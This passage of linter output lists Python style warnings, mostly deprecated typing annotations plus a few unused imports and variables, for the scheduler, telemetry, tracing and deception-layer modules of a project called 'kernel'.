    |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
607 |                 "allocation_count": len(self.allocations),
608 |                 **self.stats,
    |
help: Rewrite as a set comprehension

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\scheduler.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import IntEnum
22 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\scheduler.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import IntEnum
22 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> kernel\scheduler.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import IntEnum
22 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> kernel\scheduler.py:68:19
   |
67 |     # CPU affinity
68 |     cpu_affinity: Set[int] = field(default_factory=set)  # Allowed CPUs
   |                   ^^^
69 |     numa_node: Optional[int] = None  # NUMA node preference
   |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
  --> kernel\scheduler.py:69:16
   |
67 |     # CPU affinity
68 |     cpu_affinity: Set[int] = field(default_factory=set)  # Allowed CPUs
69 |     numa_node: Optional[int] = None  # NUMA node preference
   |                ^^^^^^^^^^^^^
70 |
71 |     # Memory requirements
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\scheduler.py:76:14
   |
75 |     # Context (saved state when not running)
76 |     context: Dict[str, Any] = field(default_factory=dict)
   |              ^^^^
77 |
78 |     # Parent/child relationships
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> kernel\scheduler.py:79:17
   |
78 |     # Parent/child relationships
79 |     parent_pid: Optional[int] = None
   |                 ^^^^^^^^^^^^^
80 |     child_pids: List[int] = field(default_factory=list)
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\scheduler.py:80:17
   |
78 |     # Parent/child relationships
79 |     parent_pid: Optional[int] = None
80 |     child_pids: List[int] = field(default_factory=list)
   |                 ^^^^
81 |
82 |     # Statistics
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> kernel\scheduler.py:118:32
    |
116 |     """
117 |
118 |     def __init__(self, config: Optional[SchedulerConfig] = None):
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^
119 |         self.config = config or SchedulerConfig()
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\scheduler.py:122:25
    |
121 |         # Process tables
122 |         self.processes: Dict[int, ProcessControlBlock] = {}
    |                         ^^^^
123 |         self.next_pid = 1
124 |         self.lock = threading.RLock()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\scheduler.py:127:28
    |
126 |         # Multi-level feedback queues (one per priority level)
127 |         self.ready_queues: Dict[Priority, List[ProcessControlBlock]] = {
    |                            ^^^^
128 |             p: [] for p in Priority
129 |         }
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\scheduler.py:127:43
    |
126 |         # Multi-level feedback queues (one per priority level)
127 |         self.ready_queues: Dict[Priority, List[ProcessControlBlock]] = {
    |                                           ^^^^
128 |             p: [] for p in Priority
129 |         }
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\scheduler.py:132:30
    |
131 |         # Per-CPU run queues for load balancing
132 |         self.cpu_run_queues: Dict[int, List[ProcessControlBlock]] = {
    |                              ^^^^
133 |             cpu: [] for cpu in range(self.config.num_cpus)
134 |         }
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\scheduler.py:132:40
    |
131 |         # Per-CPU run queues for load balancing
132 |         self.cpu_run_queues: Dict[int, List[ProcessControlBlock]] = {
    |                                        ^^^^
133 |             cpu: [] for cpu in range(self.config.num_cpus)
134 |         }
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\scheduler.py:137:23
    |
136 |         # Currently running processes (one per CPU)
137 |         self.running: Dict[int, Optional[ProcessControlBlock]] = {
    |                       ^^^^
138 |             cpu: None for cpu in range(self.config.num_cpus)
139 |         }
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\scheduler.py:137:33
    |
136 |         # Currently running processes (one per CPU)
137 |         self.running: Dict[int, Optional[ProcessControlBlock]] = {
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
138 |             cpu: None for cpu in range(self.config.num_cpus)
139 |         }
    |
help: Convert to `X | None`

C420 [*] Unnecessary dict comprehension for iterable; use `dict.fromkeys` instead
   --> kernel\scheduler.py:137:66
    |
136 |           # Currently running processes (one per CPU)
137 |           self.running: Dict[int, Optional[ProcessControlBlock]] = {
    |  __________________________________________________________________^
138 | |             cpu: None for cpu in range(self.config.num_cpus)
139 | |         }
    | |_________^
140 |
141 |           # Blocked processes (waiting for I/O)
    |
help: Replace with `dict.fromkeys(iterable, value)`)

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\scheduler.py:142:33
    |
141 |         # Blocked processes (waiting for I/O)
142 |         self.blocked_processes: Set[int] = set()
    |                                 ^^^
143 |
144 |         # Statistics
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> kernel\scheduler.py:164:23
    |
162 |         priority: Priority = Priority.NORMAL,
163 |         memory_required: int = 0,
164 |         cpu_affinity: Optional[Set[int]] = None,
    |                       ^^^^^^^^^^^^^^^^^^
165 |         parent_pid: Optional[int] = None,
166 |     ) -> int:
    |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\scheduler.py:164:32
    |
162 |         priority: Priority = Priority.NORMAL,
163 |         memory_required: int = 0,
164 |         cpu_affinity: Optional[Set[int]] = None,
    |                                ^^^
165 |         parent_pid: Optional[int] = None,
166 |     ) -> int:
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> kernel\scheduler.py:165:21
    |
163 |         memory_required: int = 0,
164 |         cpu_affinity: Optional[Set[int]] = None,
165 |         parent_pid: Optional[int] = None,
    |                     ^^^^^^^^^^^^^
166 |     ) -> int:
167 |         """Create a new process and add to ready queue"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\scheduler.py:200:44
    |
198 |             return pid
199 |
200 |     def schedule(self, cpu_id: int = 0) -> Optional[ProcessControlBlock]:
    |                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
201 |         """
202 |         Select next process to run on given CPU
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\scheduler.py:233:52
    |
231 |             return next_process
232 |
233 |     def _select_next_process(self, cpu_id: int) -> Optional[ProcessControlBlock]:
    |                                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
234 |         """Select next process respecting priority and affinity"""
235 |         # Iterate through priorities (high to low)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\scheduler.py:408:38
    |
406 |             logger.info(f"Terminated process {pid}")
407 |
408 |     def get_scheduler_stats(self) -> Dict[str, Any]:
    |                                      ^^^^
409 |         """Get comprehensive scheduler statistics"""
410 |         with self.lock:
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> kernel\scheduler.py:442:56
    |
440 |             }
441 |
442 |     def set_cpu_affinity(self, pid: int, cpu_affinity: Set[int]):
    |                                                        ^^^
443 |         """Set CPU affinity for process"""
444 |         with self.lock:
    |
help: Replace with `set`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> kernel\telemetry.py:23:1
   |
21 | from dataclasses import dataclass, field
22 | from enum import Enum
23 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\telemetry.py:23:1
   |
21 | from dataclasses import dataclass, field
22 | from enum import Enum
23 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\telemetry.py:23:1
   |
21 | from dataclasses import dataclass, field
22 | from enum import Enum
23 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | logger = logging.getLogger(__name__)
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\telemetry.py:43:13
   |
41 |     timestamp: float
42 |     value: float
43 |     labels: Dict[str, str] = field(default_factory=dict)
   |             ^^^^
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\telemetry.py:54:13
   |
52 |     description: str
53 |     unit: str
54 |     labels: List[str] = field(default_factory=list)
   |             ^^^^
55 |     values: deque = field(default_factory=lambda: deque(maxlen=10000))  # Ring buffer
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\telemetry.py:58:14
   |
57 |     # For histograms
58 |     buckets: List[float] = field(default_factory=list)
   |              ^^^^
59 |
60 |     # For summaries
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\telemetry.py:61:16
   |
60 |     # For summaries
61 |     quantiles: List[float] = field(default_factory=lambda: [0.5, 0.9, 0.95, 0.99])
   |                ^^^^
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\telemetry.py:90:23
   |
88 |     def __init__(self):
89 |         # Metric registry
90 |         self.metrics: Dict[str, Metric] = {}
   |                       ^^^^
91 |
92 |         # Alert registry
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\telemetry.py:93:22
   |
92 |         # Alert registry
93 |         self.alerts: List[Alert] = []
   |                      ^^^^
94 |
95 |         # Thread safety
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:99:26
    |
 98 |         # Aggregation caches
 99 |         self.rate_cache: Dict[str, Dict[str, float]] = defaultdict(dict)
    |                          ^^^^
100 |         self.last_values: Dict[str, float] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:99:36
    |
 98 |         # Aggregation caches
 99 |         self.rate_cache: Dict[str, Dict[str, float]] = defaultdict(dict)
    |                                    ^^^^
100 |         self.last_values: Dict[str, float] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:100:27
    |
 98 |         # Aggregation caches
 99 |         self.rate_cache: Dict[str, Dict[str, float]] = defaultdict(dict)
100 |         self.last_values: Dict[str, float] = {}
    |                           ^^^^
101 |
102 |         # Initialize standard kernel metrics
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:205:17
    |
203 |         description: str,
204 |         unit: str,
205 |         labels: Optional[List[str]] = None,
    |                 ^^^^^^^^^^^^^^^^^^^
206 |     ):
207 |         """Register a new metric"""
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\telemetry.py:205:26
    |
203 |         description: str,
204 |         unit: str,
205 |         labels: Optional[List[str]] = None,
    |                          ^^^^
206 |     ):
207 |         """Register a new metric"""
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:228:17
    |
226 |         metric_name: str,
227 |         value: float,
228 |         labels: Optional[Dict[str, str]] = None,
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^
229 |         timestamp: Optional[float] = None,
230 |     ):
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:228:26
    |
226 |         metric_name: str,
227 |         value: float,
228 |         labels: Optional[Dict[str, str]] = None,
    |                          ^^^^
229 |         timestamp: Optional[float] = None,
230 |     ):
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:229:20
    |
227 |         value: float,
228 |         labels: Optional[Dict[str, str]] = None,
229 |         timestamp: Optional[float] = None,
    |                    ^^^^^^^^^^^^^^^
230 |     ):
231 |         """Record a metric value"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:252:17
    |
250 |         metric_name: str,
251 |         amount: float = 1.0,
252 |         labels: Optional[Dict[str, str]] = None,
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^
253 |     ):
254 |         """Increment a counter metric"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:252:26
    |
250 |         metric_name: str,
251 |         amount: float = 1.0,
252 |         labels: Optional[Dict[str, str]] = None,
    |                          ^^^^
253 |     ):
254 |         """Increment a counter metric"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:275:55
    |
274 |     def set_gauge(
275 |         self, metric_name: str, value: float, labels: Optional[Dict[str, str]] = None
    |                                                       ^^^^^^^^^^^^^^^^^^^^^^^^
276 |     ):
277 |         """Set a gauge metric value"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:275:64
    |
274 |     def set_gauge(
275 |         self, metric_name: str, value: float, labels: Optional[Dict[str, str]] = None
    |                                                                ^^^^
276 |     ):
277 |         """Set a gauge metric value"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:292:55
    |
291 |     def observe_histogram(
292 |         self, metric_name: str, value: float, labels: Optional[Dict[str, str]] = None
    |                                                       ^^^^^^^^^^^^^^^^^^^^^^^^
293 |     ):
294 |         """Observe a value for histogram metric"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:292:64
    |
291 |     def observe_histogram(
292 |         self, metric_name: str, value: float, labels: Optional[Dict[str, str]] = None
    |                                                                ^^^^
293 |     ):
294 |         """Observe a value for histogram metric"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:309:41
    |
308 |     def get_metric_value(
309 |         self, metric_name: str, labels: Optional[Dict[str, str]] = None
    |                                         ^^^^^^^^^^^^^^^^^^^^^^^^
310 |     ) -> Optional[float]:
311 |         """Get latest value for metric"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:309:50
    |
308 |     def get_metric_value(
309 |         self, metric_name: str, labels: Optional[Dict[str, str]] = None
    |                                                  ^^^^
310 |     ) -> Optional[float]:
311 |         """Get latest value for metric"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:310:10
    |
308 |     def get_metric_value(
309 |         self, metric_name: str, labels: Optional[Dict[str, str]] = None
310 |     ) -> Optional[float]:
    |          ^^^^^^^^^^^^^^^
311 |         """Get latest value for metric"""
312 |         with self.lock:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:334:17
    |
332 |         metric_name: str,
333 |         window_seconds: float = 60.0,
334 |         labels: Optional[Dict[str, str]] = None,
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^
335 |     ) -> float:
336 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:334:26
    |
332 |         metric_name: str,
333 |         window_seconds: float = 60.0,
334 |         labels: Optional[Dict[str, str]] = None,
    |                          ^^^^
335 |     ) -> float:
336 |         """
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:379:17
    |
377 |         percentile: float,
378 |         window_seconds: float = 60.0,
379 |         labels: Optional[Dict[str, str]] = None,
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^
380 |     ) -> Optional[float]:
381 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:379:26
    |
377 |         percentile: float,
378 |         window_seconds: float = 60.0,
379 |         labels: Optional[Dict[str, str]] = None,
    |                          ^^^^
380 |     ) -> Optional[float]:
381 |         """
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\telemetry.py:380:10
    |
378 |         window_seconds: float = 60.0,
379 |         labels: Optional[Dict[str, str]] = None,
380 |     ) -> Optional[float]:
    |          ^^^^^^^^^^^^^^^
381 |         """
382 |         Calculate percentile value over time window
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:503:38
    |
501 |             return "\n".join(lines)
502 |
503 |     def _format_labels(self, labels: Dict[str, str]) -> str:
    |                                      ^^^^
504 |         """Format labels for Prometheus format"""
505 |         if not labels:
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\telemetry.py:511:56
    |
509 |         return "{" + ",".join(pairs) + "}"
510 |
511 |     def _get_histogram_export(self, metric: Metric) -> List[str]:
    |                                                        ^^^^
512 |         """Export histogram metric in Prometheus format"""
513 |         lines = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\telemetry.py:545:28
    |
543 |         return lines
544 |
545 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
546 |         """Get telemetry system statistics"""
547 |         with self.lock:
    |
help: Replace with `dict`

F401 `kernel.advanced_visualizations.AttackFlowStep` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> kernel\thirsty_super_kernel.py:29:9
   |
27 |     from kernel.advanced_visualizations import (
28 |         AnimatedAttackFlow,
29 |         AttackFlowStep,
   |         ^^^^^^^^^^^^^^
30 |         SplitScreenVisualizer,
31 |     )
   |
help: Remove unused import: `kernel.advanced_visualizations.AttackFlowStep`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> kernel\thirsty_super_kernel.py:313:9
    |
312 |           # Check if already in deception
313 | /         if current_layer >= 2:
314 | |             # Already in deception - record action and check for Bubblegum
315 | |             if self.config.enable_deception:
    | |____________________________________________^
316 |                   action_result = self.deception_orchestrator.record_action(
317 |                       user_id, str(cmd)
    |
help: Combine `if` statements using `and`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> kernel\tracing.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> kernel\tracing.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> kernel\tracing.py:22:1
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

F401 [*] `typing.Set` imported but unused
  --> kernel\tracing.py:22:42
   |
20 | from dataclasses import dataclass, field
21 | from enum import Enum
22 | from typing import Dict, List, Optional, Set
   |                                          ^^^
23 |
24 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.Set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\tracing.py:51:17
   |
49 |     name: str
50 |     timestamp: float
51 |     attributes: Dict[str, any] = field(default_factory=dict)
   |                 ^^^^
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\tracing.py:60:17
   |
58 |     trace_id: str
59 |     span_id: str
60 |     attributes: Dict[str, any] = field(default_factory=dict)
   |                 ^^^^
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> kernel\tracing.py:69:21
   |
67 |     trace_id: str
68 |     span_id: str
69 |     parent_span_id: Optional[str]
   |                     ^^^^^^^^^^^^^
70 |     name: str
71 |     kind: SpanKind
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> kernel\tracing.py:73:15
   |
71 |     kind: SpanKind
72 |     start_time: float
73 |     end_time: Optional[float] = None
   |               ^^^^^^^^^^^^^^^
74 |     status: SpanStatus = SpanStatus.UNSET
75 |     status_message: str = ""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\tracing.py:78:17
   |
77 |     # Attributes (tags)
78 |     attributes: Dict[str, any] = field(default_factory=dict)
   |                 ^^^^
79 |
80 |     # Events within span
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\tracing.py:81:13
   |
80 |     # Events within span
81 |     events: List[SpanEvent] = field(default_factory=list)
   |             ^^^^
82 |
83 |     # Links to other spans
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> kernel\tracing.py:84:12
   |
83 |     # Links to other spans
84 |     links: List[SpanLink] = field(default_factory=list)
   |            ^^^^
85 |
86 |     # Baggage (cross-service context)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> kernel\tracing.py:87:14
   |
86 |     # Baggage (cross-service context)
87 |     baggage: Dict[str, str] = field(default_factory=dict)
   |              ^^^^
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:114:28
    |
112 |     def __init__(self):
113 |         # Active spans (in-progress)
114 |         self.active_spans: Dict[str, Span] = {}
    |                            ^^^^
115 |
116 |         # Completed spans (for analysis)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:117:31
    |
116 |         # Completed spans (for analysis)
117 |         self.completed_spans: Dict[str, List[Span]] = {}  # trace_id -> spans
    |                               ^^^^
118 |
119 |         # Thread-local storage for current span context
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:117:41
    |
116 |         # Completed spans (for analysis)
117 |         self.completed_spans: Dict[str, List[Span]] = {}  # trace_id -> spans
    |                                         ^^^^
118 |
119 |         # Thread-local storage for current span context
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:129:25
    |
128 |         # Exporters
129 |         self.exporters: List[callable] = []
    |                         ^^^^
130 |
131 |         # Statistics
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:144:48
    |
143 |     def start_trace(
144 |         self, operation_name: str, attributes: Optional[Dict[str, any]] = None
    |                                                ^^^^^^^^^^^^^^^^^^^^^^^^
145 |     ) -> str:
146 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:144:57
    |
143 |     def start_trace(
144 |         self, operation_name: str, attributes: Optional[Dict[str, any]] = None
    |                                                         ^^^^
145 |     ) -> str:
146 |         """
    |
help: Replace with `dict`

F841 Local variable `span` is assigned to but never used
   --> kernel\tracing.py:155:13
    |
154 |             # Create root span
155 |             span = self.start_span(
    |             ^^^^
156 |                 operation_name,
157 |                 SpanKind.INTERNAL,
    |
help: Remove assignment to unused variable `span`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:171:21
    |
169 |         name: str,
170 |         kind: SpanKind = SpanKind.INTERNAL,
171 |         attributes: Optional[Dict[str, any]] = None,
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^
172 |         parent_span_id: Optional[str] = None,
173 |         trace_id: Optional[str] = None,
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:171:30
    |
169 |         name: str,
170 |         kind: SpanKind = SpanKind.INTERNAL,
171 |         attributes: Optional[Dict[str, any]] = None,
    |                              ^^^^
172 |         parent_span_id: Optional[str] = None,
173 |         trace_id: Optional[str] = None,
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:172:25
    |
170 |         kind: SpanKind = SpanKind.INTERNAL,
171 |         attributes: Optional[Dict[str, any]] = None,
172 |         parent_span_id: Optional[str] = None,
    |                         ^^^^^^^^^^^^^
173 |         trace_id: Optional[str] = None,
174 |     ) -> Span:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:173:19
    |
171 |         attributes: Optional[Dict[str, any]] = None,
172 |         parent_span_id: Optional[str] = None,
173 |         trace_id: Optional[str] = None,
    |                   ^^^^^^^^^^^^^
174 |     ) -> Span:
175 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:258:58
    |
257 |     def add_span_event(
258 |         self, span_id: str, event_name: str, attributes: Optional[Dict[str, any]] = None
    |                                                          ^^^^^^^^^^^^^^^^^^^^^^^^
259 |     ):
260 |         """Add an event to a span"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:258:67
    |
257 |     def add_span_event(
258 |         self, span_id: str, event_name: str, attributes: Optional[Dict[str, any]] = None
    |                                                                   ^^^^
259 |     ):
260 |         """Add an event to a span"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:276:21
    |
274 |         linked_trace_id: str,
275 |         linked_span_id: str,
276 |         attributes: Optional[Dict[str, any]] = None,
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^
277 |     ):
278 |         """Add a link to another span"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:276:30
    |
274 |         linked_trace_id: str,
275 |         linked_span_id: str,
276 |         attributes: Optional[Dict[str, any]] = None,
    |                              ^^^^
277 |     ):
278 |         """Add a link to another span"""
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:297:39
    |
295 |                 self.active_spans[span_id].attributes[key] = value
296 |
297 |     def inject_context(self, carrier: Dict[str, str], span_id: str) -> Dict[str, str]:
    |                                       ^^^^
298 |         """
299 |         Inject trace context into carrier (for propagation)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:297:72
    |
295 |                 self.active_spans[span_id].attributes[key] = value
296 |
297 |     def inject_context(self, carrier: Dict[str, str], span_id: str) -> Dict[str, str]:
    |                                                                        ^^^^
298 |         """
299 |         Inject trace context into carrier (for propagation)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:322:40
    |
320 |             return carrier
321 |
322 |     def extract_context(self, carrier: Dict[str, str]) -> Optional[TraceContext]:
    |                                        ^^^^
323 |         """
324 |         Extract trace context from carrier
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> kernel\tracing.py:322:59
    |
320 |             return carrier
321 |
322 |     def extract_context(self, carrier: Dict[str, str]) -> Optional[TraceContext]:
    |                                                           ^^^^^^^^^^^^^^^^^^^^^^
323 |         """
324 |         Extract trace context from carrier
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:375:38
    |
374 |     def _visualize_span(
375 |         self, span: Span, all_spans: List[Span], lines: List[str], indent: int
    |                                      ^^^^
376 |     ):
377 |         """Recursively visualize span tree"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:375:57
    |
374 |     def _visualize_span(
375 |         self, span: Span, all_spans: List[Span], lines: List[str], indent: int
    |                                                         ^^^^
376 |     ):
377 |         """Recursively visualize span tree"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:392:55
    |
390 |             self._visualize_span(child, all_spans, lines, indent + 1)
391 |
392 |     def analyze_critical_path(self, trace_id: str) -> List[Span]:
    |                                                       ^^^^
393 |         """
394 |         Analyze critical path in trace
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:422:58
    |
420 |             )
421 |
422 |     def _find_critical_path(self, span: Span, all_spans: List[Span]) -> List[Span]:
    |                                                          ^^^^
423 |         """Recursively find critical path from span"""
424 |         children = [s for s in all_spans if s.parent_span_id == span.span_id]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> kernel\tracing.py:422:73
    |
420 |             )
421 |
422 |     def _find_critical_path(self, span: Span, all_spans: List[Span]) -> List[Span]:
    |                                                                         ^^^^
423 |         """Recursively find critical path from span"""
424 |         children = [s for s in all_spans if s.parent_span_id == span.span_id]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> kernel\tracing.py:485:28
    |
483 |         return secrets.token_hex(8)
484 |
